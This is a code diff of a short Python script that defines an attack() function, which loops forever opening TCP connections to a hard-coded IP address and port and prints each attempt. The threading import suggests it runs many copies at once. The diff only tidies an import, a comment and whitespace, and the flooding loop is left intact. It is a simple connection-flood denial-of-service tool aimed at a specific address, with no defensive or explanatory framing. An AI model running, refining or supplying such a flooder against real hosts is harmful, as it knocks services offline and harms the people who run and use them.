@@ -1,5 +1,4 @@
 import socket
-import random
 import threading
 
 TARGET_IP = '91.204.209.200' 
@@ -9,10 +8,9 @@ def attack():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # Send a SYN packet to initiate connection
             s.connect((TARGET_IP, TARGET_PORT))
             print(f"Sent a connection request to {TARGET_IP}:{TARGET_PORT}")
-    
+
             s.close()
         except socket.error:
             print("Connection error occurred, target might be down or firewall blocked.")
